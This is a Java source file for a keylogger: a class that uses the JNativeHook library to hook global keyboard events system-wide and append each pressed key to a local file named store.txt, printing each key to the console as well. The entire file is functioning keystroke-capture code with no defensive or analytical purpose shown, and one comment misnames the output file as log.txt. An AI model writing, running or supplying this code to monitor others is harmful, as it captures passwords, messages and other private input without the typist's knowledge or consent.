package org.example;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.FileWriter;
import java.io.IOException;


public class Keylogger implements NativeKeyListener {

    private static FileWriter writer;

    public static void main(String[] args) {
        try {

            writer = new FileWriter("store.txt", true);

            // Register the native hook to capture global key events.
            GlobalScreen.registerNativeHook();

            // Add the current instance of Keylogger as a key listener, which will receive key events.
            GlobalScreen.addNativeKeyListener(new Keylogger());

            System.out.println("Keylogger is running...");  // Message indicating the program is running.

        } catch (NativeHookException | IOException e) {

            System.err.println("There was an error starting the keylogger: " + e.getMessage());
        }
    }


    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            // Get the text representation of the pressed key.
            String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
            System.out.println("Key Pressed: " + keyText);

            // Write the key pressed to the log.txt file, followed by a newline.
            writer.write(keyText + "\n");
            writer.flush();

        } catch (IOException ex) {

            System.err.println("Error writing to the file: " + ex.getMessage());
        }
    }

}
